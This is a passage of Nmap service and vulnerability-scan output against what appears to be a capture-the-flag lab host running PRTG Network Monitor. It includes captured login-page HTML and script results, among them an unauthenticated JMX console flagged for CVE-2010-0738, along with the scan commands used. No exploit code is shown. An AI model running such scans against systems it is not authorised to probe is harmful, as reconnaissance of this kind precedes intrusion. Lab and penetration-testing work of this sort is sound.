\xD7\xA9\xD7\x9C\xD7\x9A&amp;lt;/a&amp;gt;';\x0D
+|     t.nb = 'Nettleseren din (%s) er &amp;lt;b&amp;gt;utdatert&amp;lt;/b&amp;gt;. Den har kjente &amp;lt;b&amp;gt;sikkerhetshull&amp;lt;/b&amp;gt; og &amp;lt;b&amp;gt;kan ikke vise alle funksjonene&amp;lt;/b&amp;gt; p\xC3\xA5 denne og andre websider. &amp;lt;a%s&amp;gt;L\xC3\xA6r hvordan du kan oppdatere din nettleser&amp;lt;/a&amp;gt;';\x0D
+|     t[&quot;zh-tw&quot;] = '\xE6\x82\xA8\xE7\x9A\x84\xE7\x80\x8F\xE8\xA6\xBD\xE5\x99\xA8(%s) \xE9\x9C\x80\xE8\xA6\x81\xE6\x9B\xB4\xE6\x96\xB0\xE3\x80\x82\xE8\xA9\xB2\xE7\x80\x8F\xE8\xA6\xBD\xE5\x99\xA8\xE6\x9C\x89\xE8\xAB\xB8\xE5\xA4\x9A\xE5\xAE\x89\xE5\x85\xA8\xE6\xBC\x8F\xE6\xB4\x9E\xEF\xBC\x8C\xE7\x84\xA1\xE6\xB3\x95\xE9\xA1\xAF\xE7\xA4\xBA\xE6\x9C\xAC\xE7\xB6\xB2\xE7\xAB\x99\xE7\x9A\x84\xE6\x89\x80\xE6\x9C\x89\xE5\x8A\x9F\xE8\x83\xBD\xE3\x80\x82 &amp;lt;a%s&amp;gt;\xE7\x9E\xAD\xE8\xA7\xA3\xE5\xA6\x82\xE4\xBD\x95\xE6\x9B\xB4\xE6\x96\xB0\xE7\x80\x8F\xE8\xA6\xBD\xE5\x99\xA8&amp;lt;/a&amp;gt;';\x0D
+|     t.zh = '&amp;lt;b&amp;gt;\xE6\x82\xA8\xE7\x9A\x84\xE7\xBD\x91\xE9\xA1\xB5\xE6\xB5\x8F\xE8\xA7\x88\xE5\x99\xA8 (%s) \xE5\xB7\xB2\xE8\xBF\x87\xE6\x9C\x9F&amp;lt;/b&amp;gt;\xE3\x80\x82\xE6\x9B\xB4\xE6\x96\xB0\xE6\x82\xA8\xE7\x9A\x84\xE6\xB5\x8F\xE8\xA7\x88\xE5\x99\xA8\xEF\xBC\x8C\xE4\xBB\xA5\xE6\x8F\x90\xE9\xAB\x98\xE5\xAE\x89\xE5\x85\xA8\xE6\x80\xA7\xE5\x92\x8C\xE8\x88\x92\xE9\x80\x82\xE6\x80\xA7\xEF\xBC\x8C\xE5\xB9\xB6\xE8\x8E\xB7\xE5\xBE\x97\xE8\xAE\xBF\xE9\x97\xAE\xE6\x9C\xAC\xE7\xBD\x91\xE7\xAB\x99\xE7\x9A\x84\xE6\x9C\x80\xE4\xBD\xB3\xE4\xBD\x93\xE9\xAA\x8C\xE3\x80\x82&amp;lt;a%s&amp;gt;\xE6\x9B\xB4\xE6\x96\xB0\xE6\xB5\x8F\xE8\xA7\x88\xE5\x99\xA8&amp;lt;/a&amp;gt; &amp;lt;a%s&amp;gt;\xE5\xBF\xBD\xE7\x95\xA5&amp;lt;/a&amp;gt;';\x0D
+|     t.fi = 'Selaimesi (%s) on &amp;lt;b&amp;gt;vanhentunut&amp;lt;/b&amp;gt;. Siin\xC3\xA4 on tunnettuja tietoturvaongelmia eik\xC3\xA4 se v\xC3\xA4ltt\xC3\xA4m\xC3\xA4tt\xC3\xA4 tue kaikkia ominaisuuksia t\xC3\xA4ll\xC3\xA4 tai muilla sivustoilla. &amp;lt;a%s&amp;gt;Lue lis\xC3\xA4\xC3\xA4 siit\xC3\xA4 kuinka p\xC3\xA4ivit\xC3\xA4t selaimesi&amp;lt;/a&amp;gt;.';\x0D
+|     t.tr = 'Taray\xC4\xB1c\xC4\xB1n\xC4\xB1z (%s) &amp;lt;b&amp;gt;g\xC3\xBCncel de\xC4\x9Fil&amp;lt;/b&amp;gt;. Eski versiyon oldu\xC4\x9Fu i\xC3\xA7in &amp;lt;b&amp;gt;g\xC3\xBCvenlik a\xC3\xA7\xC4\xB1klar\xC4\xB1&amp;lt;/b&amp;gt; vard\xC4\xB1r ve g\xC3\xB6rmek istedi\xC4\x9Finiz bu web sitesinin ve di\xC4\x9Fer web sitelerinin &amp;lt;b&amp;gt;t\xC3\xBCm \xC3\xB6zelliklerini hatas\xC4\xB1z bir \xC5\x9Fekilde&amp;lt;/b&amp;gt; g\xC3\xB6steremeyecektir. &amp;lt;a%s&amp;gt;Taray\xC4\xB1c\xC4\xB1n\xC4\xB1z\xC4\xB1 nas\xC4\xB1l g\xC3\xBCncelleyebilece\xC4\x9Finizi \xC3\xB6\xC4\x9Frenin&amp;lt;/a&amp;gt;';\x0D
+|     t.ro = 'Browser-ul (%s) tau este &amp;lt;b&amp;gt;invechit&amp;lt;/b&amp;gt;. Detine &amp;lt;b&amp;gt;probleme de securitate&amp;lt;/b&amp;gt; cunoscute si poate &amp;lt;b&amp;gt;sa nu afiseze corect&amp;lt;/b&amp;gt; toate elementele acestui si altor site-uri. &amp;lt;a%s&amp;gt;Invata cum sa-ti actualizezi browserul.&amp;lt;/a&amp;gt;';\x0D
+|     t.bg = '\xD0\x92\xD0\xB0\xD1\x88\xD0\xB8\xD1\x8F\xD1\x82 \xD0\xB1\xD1\x80\xD0\xB0\xD1\x83\xD0\xB7\xD1\x8A\xD1\x80 (%s) &amp;lt;b&amp;gt;\xD0\xBD\xD0\xB5 \xD0\xB5 \xD0\xB0\xD0\xBA\xD1\x82\xD1\x83\xD0\xB0\xD0\xBB\xD0\xB5\xD0\xBD&amp;lt;/b&amp;gt;. \xD0\x98\xD0\xB7\xD0\xB2\xD0\xB5\xD1\x81\xD1\x82\xD0\xBD\xD0\xBE \xD0\xB5, \xD1\x87\xD0\xB5 \xD0\xB8\xD0\xBC\xD0\xB0 &amp;lt;b&amp;gt;\xD0\xBF\xD1\x80\xD0\xBE\xD0\xBF\xD1\x83\xD1\x81\xD0\xBA\xD0\xB8 \xD0\xB2 \xD1\x81\xD0\xB8\xD0\xB3\xD1\x83\xD1\x80\xD0\xBD\xD0\xBE\xD1\x81\xD1\x82\xD1\x82\xD0\xB0&amp;lt;/b&amp;gt; \xD0\xB8 \xD0\xBC\xD0\xBE\xD0\xB6\xD0\xB5 &amp;lt;b&amp;gt;\xD0\xB4\xD0\xB0 \xD0\xBD\xD0\xB5 \xD0\xBF\xD0\xBE\xD0\xBA\xD0\xB0\xD0\xB6\xD0\xB5 \xD0\xBF\xD1\x80\xD0\xB0\xD0\xB2\xD0\xB8\xD0\xBB\xD0\xBD\xD0\xBE&amp;lt;/b&amp;gt; \xD1\x82\xD0\xBE\xD0\xB7\xD0\xB8 \xD0\xB8\xD0\xBB\xD0\xB8 \xD0\xB4\xD1\x80\xD1\x83\xD0\xB3\xD0\xB8 \xD1\x81\xD0\xB0\xD0\xB9\xD1\x82\xD0\xBE\xD0\xB2\xD0\xB5. &amp;lt;a%s&amp;gt;\xD0\x9D\xD0\xB0\xD1\x83\xD1\x87\xD0\xB5\xD1\x82\xD0\xB5 \xD0\xBA\xD0\xB0\xD0\xBA \xD0\xB4\xD0\xB0 \xD0\xB0\xD0\xBA\xD1\x82\xD1\x83\xD0\xB0\xD0\xBB\xD0\xB8\xD0\xB7\xD0\xB8\xD1\x80\xD0\xB0\xD1\x82\xD0\xB5 \xD0\xB1\xD1\x80\xD0\xB0\xD1\x83\xD0\xB7\xD1\x8A\xD1\x80\xD0\xB0 \xD1\x81\xD0\xB8&amp;lt;/a&amp;gt;.';\x0D
+|     t.el = '\xCE\x91\xCF\x85\xCF\x84\xCF\x8C\xCF\x82 \xCE\xBF \xCE\xB9\xCF\x83\xCF\x84\xCF\x8C\xCF\x84\xCE\xBF\xCF\x80\xCE\xBF\xCF\x82 \xCF\x83\xCE\xB1\xCF\x82 \xCF\x85\xCF\x80\xCE\xB5\xCE\xBD\xCE\xB8\xCF\x85\xCE\xBC\xCE\xAF\xCE\xB6\xCE\xB5\xCE\xB9: \xCE\x9F \xCF\x86\xCF\x85\xCE\xBB\xCE\xBB\xCE\xBF\xCE\xBC\xCE\xB5\xCF\x84\xCF\x81\xCE\xB7\xCF\x84\xCE\xAE\xCF\x82 \xCF\x83\xCE\xB1\xCF\x82 (%s) \xCE\xB5\xCE\xAF\xCE\xBD\xCE\xB1\xCE\xB9 &amp;lt;b&amp;gt;\xCF\x80\xCE\xB1\xCF\x81\xCF\x89\xCF\x87\xCE\xB7\xCE\xBC\xCE\xAD\xCE\xBD\xCE\xBF\xCF\x82&amp;lt;/b&amp;gt;. &amp;lt;a%s&amp;gt;\xCE\x95\xCE\xBD\xCE\xB7\xCE\xBC\xCE\xB5\xCF\x81\xCF\x8E\xCF\x83\xCF\x84\xCE\xB5 \xCF\x84\xCE\xBF \xCF\x80\xCF\x81\xCF\x8C\xCE\xB3\xCF\x81\xCE\xB1\xCE\xBC\xCE\xBC\xCE\xB1 \xCF\x80\xCE\xB5\xCF\x81\xCE\xB9\xCE\xAE\xCE\xB3\xCE\xB7\xCF\x83\xCE\xAE\xCF\x82 \xCF\x83\xCE\xB1\xCF\x82&amp;lt;/a&amp;gt; \xCE\xB3\xCE\xB9\xCE\xB1 \xCE\xBC\xCE\xB5\xCE\xB3\xCE\xB1\xCE\xBB\xCF\x8D\xCF\x84\xCE\xB5\xCF\x81\xCE\xB7 \xCE\xB1\xCF\x83\xCF\x86\xCE\xAC\xCE\xBB\xCE\xB5\xCE\xB9\xCE\xB1 \xCE\xBA\xCE\xB1\xCE\xB9 \xCE\xAC\xCE\xBD\xCE\xB5\xCF\x83\xCE\xB7 \xCF\x83\xCE\xB5 \xCE\xB1\xCF\x85\xCF\x84\xCE\xAE\xCE\xBD \xCF\x84\xCE\xB7\xCE\xBD \xCE\xB9\xCF\x83\xCF\x84\xCE\xBF\xCF\x83\xCE\xB5\xCE\xBB\xCE\xAF\xCE\xB4\xCE\xB1.';\x0D
+|     t.ar = '\xD9\x85\xD8\xAA\xD8\xB5\xD9\x81\xD8\xAD\xD9\x83 (%s) &amp;lt;b&amp;gt;\xD9\x85\xD9\x86\xD8\xAA\xD9\x87\xD9\x89 \xD8\xA7\xD9\x84\xD8\xB5\xD9\x84\xD8\xA7\xD8\xAD\xD9\x8A\xD9\x87&amp;lt;/b&amp;gt;. \xD9\x88\xD9\x8A\xD9\x88\xD8\xAC\xD8\xAF \xD8\xA8\xD9\x87 &amp;lt;b&amp;gt;\xD8\xAB\xD8\xBA\xD8\xB1\xD8\xA7\xD8\xAA \xD8\xA7\xD9\x85\xD9\x86\xD9\x8A\xD8\xA9&amp;lt;/b&amp;gt; \xD9\x85\xD8\xB9\xD8\xB1\xD9\x88\xD9\x81\xD8\xA9 \xD9\x88\xD9\x82\xD8\xAF &amp;lt;b&amp;gt;\xD9\x84\xD8\xA7 \xD9\x8A\xD9\x8F\xD8\xB4\xD8\xBA\xD9\x84 \xD9\x83\xD8\xAB\xD9\x8A\xD8\xB1 \xD9\x85\xD9\x86 \xD8\xA7\xD9\x84\xD9\x85\xD9\x8A\xD8\xB2\xD8\xA7\xD8\xAA&amp;lt;/b&amp;gt; \xD8\xA7\xD9\x84\xD9\x85\xD8\xAA\xD8\xB9\xD9\x84\xD9\x82\xD9\x87 \xD8\xA8\xD9\x87\xD8\xB0\xD9\x87 \xD8\xA7\xD9\x84\xD9\x85\xD9\x88\xD9\x82\xD8\xB9. &amp;lt;a%s&amp;gt;\xD8\xA3\xD8\xB6\xD8\xBA\xD8\xB7 \xD9\x87\xD9\x86\xD8\xA7&amp;lt;/a&amp;gt;\xD9\x84\xD8\xAA\xD8\xB9\xD8\xB1\xD9\x81 \xD9\x83\xD9\x8A\xD9\x81 \xD8\xAA\xD9\x82\xD9\x88\xD9\x85 \xD8\xA8\xD8\xAA\xD8\xAD\xD8\xAF\xD9\x8A\xD8\xAB \xD9\x85\xD8\xAA\xD8\xB5\xD9\x81\xD8\xAD\xD9\x83';\x0D
+|     t.sr = 'Va\xC5\xA1 pretra\xC5\xBEiva\xC4\x8D (%s) je &amp;lt;b&amp;gt;zastareo&amp;lt;/b&amp;gt;. Ima poznate &amp;lt;b&amp;gt;sigurnosne probleme&amp;lt;/b&amp;gt; i najverovatnije &amp;lt;b&amp;gt;ne\xC4\x87e prikazati sve funkcionalnisti&amp;lt;/b&amp;gt; ovog i drugih sajtova. &amp;lt;a%s&amp;gt;Nau\xC4\x8Di vi\xC5\xA1e o nadogradnji svog pretra\xC5\xBEiva\xC4\x8Da&amp;lt;/a&amp;gt;';\x0D
+|     t.la = 'M\xC4\x93s v\xC4\x93lamies Jums atg\xC4\x81din\xC4\x81t: J\xC5\xABsu p\xC4\x81rl\xC5\xABkprogramma (%s) ir novecojusi. &amp;lt;a&amp;gt;Atjauniniet savu p\xC4\x81rl\xC5\xABkprogrammu&amp;lt;/a&amp;gt;, lai uzlabotu dro\xC5\xA1\xC4\xABbu, \xC4\x81trumu un p\xC4\x81rl\xC5\xABko\xC5\xA1anas \xC4\x93rt\xC4\xABbas \xC5\xA1aj\xC4\x81 un cit\xC4\x81s lap\xC4\x81s.';\x0D
+|     t.ga = 'T\xC3\xA1 an l\xC3\xADonl\xC3\xA9itheoir agat (%s) &amp;lt;b&amp;gt;as d\xC3\xA1ta&amp;lt;/b&amp;gt;. T\xC3\xA1 &amp;lt;b&amp;gt;laigeachta\xC3\xAD sl\xC3\xA1nd\xC3\xA1la&amp;lt;/b&amp;gt; a bhfuil ar eolas ann agus b\'fh\xC3\xA9idir &amp;lt;b&amp;gt;nach taispe\xC3\xA1nfaidh s\xC3\xA9 gach gn\xC3\xA9&amp;lt;/b&amp;gt; den su\xC3\xADomh gr\xC3\xA9as\xC3\xA1in seo n\xC3\xA1 cinn eile. &amp;lt;a%s&amp;gt;Foghlaim conas do l\xC3\xADonl\xC3\xA9itheoir a nuashonr\xC3\xBA&amp;lt;/a&amp;gt;';\x0D
+|     t.lv = 'J\xC5\xABsu p\xC4\x81rl\xC5\xABkprogramma (%s) ir &amp;lt;b&amp;gt;novecojusi&amp;lt;/b&amp;gt;.  Tai ir zin\xC4\x81mas &amp;lt;b&amp;gt;dro\xC5\xA1\xC4\xABbas probl\xC4\x93mas&amp;lt;/b&amp;gt;, un t\xC4\x81 var att\xC4\x93lot \xC5\xA1o un citas  t\xC4\xABmek\xC4\xBCa lapas &amp;lt;b&amp;gt;nekorekti&amp;lt;/b&amp;gt;. &amp;lt;a%s&amp;gt;Uzzini, k\xC4\x81 atjaunot savu p\xC4\x81rl\xC5\xABkprogrammu&amp;lt;/a&amp;gt;';\x0D
+|     t.no = 'Dette nettstedet \xC3\xB8nsker \xC3\xA5 minne deg p\xC3\xA5: Din nettleser (%s) er &amp;lt;b&amp;gt;utdatert&amp;lt;/b&amp;gt;. &amp;lt;a%s&amp;gt;Oppdater nettleseren din &amp;lt;/a&amp;gt; for mer sikkerhet, komfort og den beste opplevelsen p\xC3\xA5 denne siden.';\x0D
+|     t.th = '\xE0\xB9\x80\xE0\xB8\xA7\xE0\xB9\x87\xE0\xB8\x9A\xE0\xB9\x84\xE0\xB8\x8B\xE0\xB8\x95\xE0\xB9\x8C\xE0\xB8\x99\xE0\xB8\xB5\xE0\xB9\x89\xE0\xB8\xAD\xE0\xB8\xA2\xE0\xB8\xB2\xE0\xB8\x81\xE0\xB8\x88\xE0\xB8\xB0\xE0\xB9\x80\xE0\xB8\x95\xE0\xB8\xB7\xE0\xB8\xAD\xE0\xB8\x99\xE0\xB8\x84\xE0\xB8\xB8\xE0\xB8\x93: \xE0\xB9\x80\xE0\xB8\x9A\xE0\xB8\xA3\xE0\xB8\xB2\xE0\xB8\xA7\xE0\xB9\x8C\xE0\xB9\x80\xE0\xB8\x8B\xE0\xB8\xAD\xE0\xB8\xA3\xE0\xB9\x8C (%s) \xE0\xB8\x82\xE0\xB8\xAD\xE0\xB8\x87\xE0\xB8\x84\xE0\xB8\xB8\xE0\xB8\x93\xE0\xB8\x99\xE0\xB8\xB1\xE0\xB9\x89\xE0\xB8\x99 &amp;lt;b&amp;gt;\xE0\xB8\xA5\xE0\xB9\x89\xE0\xB8\xB2\xE0\xB8\xAA\xE0\xB8\xA1\xE0\xB8\xB1\xE0\xB8\xA2\xE0\xB9\x81\xE0\xB8\xA5\xE0\xB9\x89\xE0\xB8\xA7&amp;lt;/b&amp;gt; &amp;lt;a%s&amp;gt;\xE0\xB8\x9B\xE0\xB8\xA3\xE0\xB8\xB1\xE0\xB8\x9A\xE0\xB8\x9B\xE0\xB8\xA3\xE0\xB8\xB8\xE0\xB8\x87\xE0\xB9\x80\xE0\xB8\x9A\xE0\xB8\xA3\xE0\xB8\xB2\xE0\xB8\xA7\xE0\xB9\x8C\xE0\xB9\x80\xE0\xB8\x8B\xE0\xB8\xAD\xE0\xB8\xA3\xE0\xB9\x8C\xE0\xB8\x82\xE0\xB8\xAD\xE0\xB8\x87\xE0\xB8\x84\xE0\xB8\xB8\xE0\xB8\x93&amp;lt;/a&amp;gt; \xE0\xB9\x80\xE0\xB8\x9E\xE0\xB8\xB7\xE0\xB9\x88\xE0\xB8\xAD\xE0\xB9\x80\xE0\xB8\x9E\xE0\xB8\xB4\xE0\xB9\x88\xE0\xB8\xA1 \xE0\xB8\x84\xE0\xB8\xA7\xE0\xB8\xB2\xE0\xB8\xA1\xE0\xB8\x9B\xE0\xB8\xA5\xE0\xB8\xAD\xE0\xB8\x94\xE0\xB8\xA0\xE0\xB8\xB1\xE0\xB8\xA2 \xE0\xB8\x84\xE0\xB8\xA7\xE0\xB8\xB2\xE0\xB8\xA1\xE0\xB8\xAA\xE0\xB8\xB0\xE0\xB8\x94\xE0\xB8\xA7\xE0\xB8\x81\xE0\xB8\xAA\xE0\xB8\x9A\xE0\xB8\xB2\xE0\xB8\xA2\xE0\xB9\x81\xE0\xB8\xA5\xE0\xB8\xB0\xE0\xB8\x9B\xE0\xB8\xA3\xE0\xB8\xB0\xE0\xB8\xAA\xE0\xB8\x9A\xE0\xB8\x81\xE0\xB8\xB2\xE0\xB8\xA3\xE0\xB8\x93\xE0\xB9\x8C\xE0\xB8\x97\xE0\xB8\xB5\xE0\xB9\x88\xE0\xB8\x94\xE0\xB8\xB5\xE0\xB8\x97\xE0\xB8\xB5\xE0\xB9\x88\xE0\xB8\xAA\xE0\xB8\xB8\xE0\xB8\x94\xE0\xB9\x83\xE0\xB8\x99\xE0\xB9\x80\xE0\xB8\xA7\xE0\xB9\x87\xE0\xB8\x9A\xE0\xB9\x84\xE0\xB8\x8B\xE0\xB8\x95\xE0\xB9\x8C\xE0\xB8\x99\xE0\xB8\xB5\xE0\xB9\x89';\x0D
+|     t.hi = '\xE0\xA4\xAF\xE0\xA4\xB9 \xE0\xA4\xB5\xE0\xA5\x87\xE0\xA4\xAC\xE0\xA4\xB8\xE0\xA4\xBE\xE0\xA4\x87\xE0\xA4\x9F \xE0\xA4\x86\xE0\xA4\xAA\xE0\xA4\x95\xE0\xA5\x8B \xE0\xA4\xAF\xE0\xA4\xBE\xE0\xA4\xA6 \xE0\xA4\xA6\xE0\xA4\xBF\xE0\xA4\xB2\xE0\xA4\xBE\xE0\xA4\xA8\xE0\xA4\xBE \xE0\xA4\x9A\xE0\xA4\xBE\xE0\xA4\xB9\xE0\xA4\xA4\xE0\xA5\x80 \xE0\xA4\xB9\xE0\xA5\x88\xE0\xA4\x82: \xE0\xA4\x86\xE0\xA4\xAA\xE0\xA4\x95\xE0\xA4\xBE \xE0\xA4\xAC\xE0\xA5\x8D\xE0\xA4\xB0\xE0\xA4\xBE\xE0\xA4\x89\xE0\xA4\x9C\xE0\xA4\xBC\xE0\xA4\xB0 (%s) &amp;lt;b&amp;gt; \xE0\xA4\x86\xE0\xA4\x89\xE0\xA4\x9F \xE0\xA4\x91\xE0\xA5\x9E \xE0\xA4\xA1\xE0\xA5\x87\xE0\xA4\x9F &amp;lt;/ b&amp;gt; \xE0\xA4\xB9\xE0\xA5\x88\xE0\xA4\x82\xE0\xA5\xA4 &amp;lt;a%s&amp;gt; \xE0\xA4\x94\xE0\xA4\xB0 \xE0\xA4\x85\xE0\xA4\xA7\xE0\xA4\xBF\xE0\xA4\x95 \xE0\xA4\xB8\xE0\xA5\x81\xE0\xA4\xB0\xE0\xA4\x95\xE0\xA5\x8D\xE0\xA4\xB7\xE0\xA4\xBE, \xE0\xA4\x86\xE0\xA4\xB0\xE0\xA4\xBE\xE0\xA4\xAE \xE0\xA4\x94\xE0\xA4\xB0 \xE0\xA4\x87\xE0\xA4\xB8 \xE0\xA4\xB8\xE0\xA4\xBE\xE0\xA4\x87\xE0\xA4\x9F \xE0\xA4\xAA\xE0\xA4\xB0 \xE0\xA4\xB8\xE0\xA4\xAC\xE0\xA4\xB8\xE0\xA5\x87 \xE0\xA4\x85\xE0\xA4\x9A\xE0\xA5\x8D\xE0\xA4\x9B\xE0\xA4\xBE \xE0\xA4\x85\xE0\xA4\xA8\xE0\xA5\x81\xE0\xA4\xAD\xE0\xA4\xB5 \xE0\xA4\x95\xE0\xA4\xB0\xE0\xA4\xA8\xE0\xA5\x87 \xE0\xA4\xB2\xE0\xA4\xBF\xE0\xA4\x8F \xE0\xA4\x86\xE0\xA4\xAA\xE0\xA4\x95\xE0\xA5\x87 \xE0\xA4\xAC\xE0\xA5\x8D\xE0\xA4\xB0\xE0\xA4\xBE\xE0\xA4\x89\xE0\xA4\x9C\xE0\xA4\xBC\xE0\xA4\xB0 \xE0\xA4\x95\xE0\xA5\x8B \xE0\xA4\x85\xE0\xA4\xAA\xE0\xA4\xA1\xE0\xA5\x87\xE0\xA4\x9F \xE0\xA4\x95\xE0\xA4\xB0\xE0\xA5\x87\xE0\xA4\x82&amp;lt;/a&amp;gt;\xE0\xA5\xA4';\x0D
+|     t.sk = 'Chceli by sme V\xC3\xA1m pripomen\xC3\xBA\xC5\xA5: V\xC3\xA1\xC5\xA1 prehliada\xC4\x8D (%s) je &amp;lt;b&amp;gt;zastaral\xC3\xBD&amp;lt;/b&amp;gt;. &amp;lt;a%s&amp;gt;Aktualizujte si ho&amp;lt;/a&amp;gt; pre viac bezpe\xC4\x8Dnosti, pohodlia a pre ten najlep\xC5\xA1\xC3\xAD z\xC3\xA1\xC5\xBEitok na tejto str\xC3\xA1nke.';\x0D
+|     t.vi = 'Website n\xC3\xA0y xin nh\xE1\xBA\xAFc b\xE1\xBA\xA1n r\xE1\xBA\xB1ng: Tr\xC3\xACnh duy\xE1\xBB\x87t (%s) c\xE1\xBB\xA7a b\xE1\xBA\xA1n hi\xE1\xBB\x87n \xC4\x91\xC3\xA3 &amp;lt;b&amp;gt;l\xE1\xBB\x97i th\xE1\xBB\x9Di&amp;lt;/b&amp;gt;. &amp;lt;a%s&amp;gt;H\xC3\xA3y c\xE1\xBA\xADp nh\xE1\xBA\xADt tr\xC3\xACnh duy\xE1\xBB\x87t c\xE1\xBB\xA7a b\xE1\xBA\xA1n&amp;lt;/a&amp;gt; \xC4\x91\xE1\xBB\x83 t\xC4\x83ng th\xC3\xAAm t\xC3\xADnh b\xE1\xBA\xA3o m\xE1\xBA\xADt, s\xE1\xBB\xB1 ti\xE1\xBB\x87n l\xE1\xBB\xA3i v\xC3\xA0 tr\xE1\xBA\xA3i nghi\xE1\xBB\x87m tuy\xE1\xBB\x87t nh\xE1\xBA\xA5t tr\xC3\xAAn trang web n\xC3\xA0y.';\x0D
+| \x0D
+|     var text = t[ll] || t.en;\x0D
+|     text = busprintf(text, bb.t, ' class=&quot;update arrow&quot; href=&quot;//www.google.com/chrome&quot; target=&quot;_blank&quot;' ,' style=&quot;display:none&quot;');\x0D
+|     var div = document.createElement('div');\x0D
+|     div.className = &quot;browsercheck js-adjustToMenu&quot;;\x0D
+|     div.innerHTML = '&amp;lt;div class=&quot;browsercheck_inner&quot;&amp;gt;' +\x0D
+|                         '&amp;lt;button title=&quot;'+_Prtg.Lang.Dialogs.strings.close+'&quot; class=&quot;browsercheck-ignore glyph-cancel-1&quot;&amp;gt;&amp;lt;/button&amp;gt;' +\x0D
+|                         '&amp;lt;p&amp;gt;' + text + '&amp;lt;/p&amp;gt;' +\x0D
+|                     '&amp;lt;/div&amp;gt;';\x0D
+|     document.body.insertBefore(div, document.body.firstChild);\x0D
+|     document.getElementsByClassName(&quot;browsercheck-ignore&quot;)[0].onclick = function(){\x0D
+|       !!localStorage &amp;amp;&amp;amp; localStorage.setItem(&quot;browsercheck&quot;, false);\x0D
+|       div.style =&quot;display:none&quot;\x0D
+|     };\x0D
+|     !!localStorage &amp;amp;&amp;amp; localStorage.setItem(&quot;browsercheck&quot;, JSON.stringify({l:ll,b:bb}));\x0D
+|   }\x0D
+| \x0D
+|   function busprintf() {\x0D
+|     var args = arguments;\x0D
+|     var data = args[0];\x0D
+|     for (var k = 1; k &amp;lt;args.length; ++k)\x0D
+|       data = data.replace(/%s/, args[k]);\x0D
+|     return data;\x0D
+|   }\x0D
+|   function getURLParameter(name) {\x0D
+|     return decodeURIComponent((new RegExp('[?|&amp;amp;]' + name + '=' + '([^&amp;amp;;]+?)(&amp;amp;|#|;|$)').exec(location.search) || [null, ''])[1].replace(/\+/g, '%20')) || null;\x0D
+|   }\x0D
+|   //test add browsercheck = {&quot;l&quot;:&quot;en&quot;,&quot;b&quot;:{&quot;n&quot;:&quot;c&quot;,&quot;v&quot;:10,&quot;t&quot;:&quot;Chrome 10&quot;,&quot;donotnotify&quot;:false,&quot;mobile&quot;:false}} to localStrorage\x0D
+|   //or add browser=ABCD.12 to the URL\x0D
+|   var test = getURLParameter('browser');\x0D
+|   if(!!test)\x0D
+|     localStorage.removeItem(&quot;browsercheck&quot;)\x0D
+|   $buo({mobile: false}, test);\x0D
+| \x0D
+| })(window, document);\x0D
+| \x0D
+| \x0D
+|   function byId(id) {\x0D
+|     return document.getElementById(id);\x0D
+|   }\x0D
+| \x0D
+| \x0D
+|   if(!document.addEventListener) {\x0D
+|       document.getElementById(&quot;unsupportedbrowser&quot;).style.display = &quot;block&quot;;\x0D
+|     }\x0D
+|   else {\x0D
+|       document.addEventListener(&quot;DOMContentLoaded&quot;, function(event) {\x0D
+|       var mobile = false;\x0D
+|       var unofficiallysupported=false;\x0D
+|       var unsupportedbrowser=false;\x0D
+| \x0D
+|     // OK, this code runs, we have least Javascript in this browser\x0D
+|         byId(&quot;loginusername&quot;).addEventListener('keydown',function(event){\x0D
+|           byId(&quot;loginpassword&quot;).type = &quot;password&quot;;\x0D
+|     },{once:true})\x0D
+|     // Clear the session storage cache (debugging only)\x0D
+|     !!window.sessionStorage&amp;amp;&amp;amp;window.sessionStorage.clear();\x0D
+| \x0D
+|     unsupportedbrowser = true;\x0D
+|     if (unsupportedbrowser) {\x0D
+|       byId(&quot;unsupportedbrowser&quot;).style.display=&quot;block&quot;;\x0D
+|       return;\x0D
+|     }\x0D
+| \x0D
+|     if (window.location.host==&quot;localhost&quot;) {\x0D
+|         byId(&quot;dontuselocalhost&quot;).style.display=&quot;block&quot;;\x0D
+|       }\x0D
+|     });\x0D
+|   }\x0D
+| &amp;lt;/script&amp;gt;\x0D
+| &amp;lt;!--\x0D
+| //        You can use this file to modify the appearance of the PRTG web interface\x0D
+| //        as described in https://kb.paessler.com/en/topic/33\x0D
+| //        \x0D
+| //        Please note that you are using an unsupported and deprecated feature. \x0D
+| //        Your changes will be broken or removed with future PRTG updates.\x0D
+| //        \x0D
+| //        If you modify this file, PLEASE LET US KNOW what you're changing and why!\x0D
+| //        Just drop an email to support@paessler.com and help us understand your \x0D
+| //        needs. Thank you!       \x0D
+| --&amp;gt;\x0D
+| \x0D
+| &amp;lt;/body&amp;gt;\x0D
+|_&amp;lt;/html&amp;gt;
+|_http-majordomo2-dir-traversal: ERROR: Script execution failed (use -d to debug)
+|_http-server-header: PRTG/18.1.37.13946
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+| http-title: Welcome | PRTG Network Monitor (NETMON)
+|_Requested resource was /index.htm
+|_http-trane-info: Problem with XML parsing of /evox/about
+| http-vuln-cve2010-0738: 
+|_  /jmx-console/: Authentication was not required
+|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 567.07 seconds
+
+				 nmap -sV -A --script=default,vuln -p 135 10.10.10.152
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-07 18:52 IST
+Nmap scan report for 10.10.10.152 (10.10.10.152)
+Host is up (0.20s latency).
+
+PORT    STATE SERVICE VERSION
+135/tcp open  msrpc   Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.64 seconds
+
+				 nmap -sV -A --script=default,vuln -p 139 10.10.10.152
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-07 18:53 IST
+Nmap scan report for 10.10.10.152 (10.10.10.152)
+Host is up (0.20s latency).
+
+PORT    STATE SERVICE     VERSION
+139/tcp open  netbios-ssn Microsoft Windows netbios-ssn
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_samba-vuln-cve-2012-1182: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!
+|_smb2-security-mode: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!
+|_smb2-time: ERROR: Script execution failed (use -d to debug)
+
